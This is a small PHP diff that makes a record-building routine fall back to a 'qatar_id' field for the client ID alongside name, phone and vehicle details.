@@ -51,7 +51,7 @@ try {
         'referenceId' => $v['visitor_id'],
         'country' => $country,
         'clientName' => $details['name_ar'] ?? $details['username'] ?? '-',
-        'clientId' => $details['id_number'] ?? '-',
+        'clientId' => $details['id_number'] ?? $details['qatar_id'] ?? '-',
         'clientPhone' => $details['phone_number'] ?? '-',
         'vehiclePlate' => $details['vehicle_plate'] ?? '-',
         'vehicleType' => $details['vehicle_type'] ?? '-',
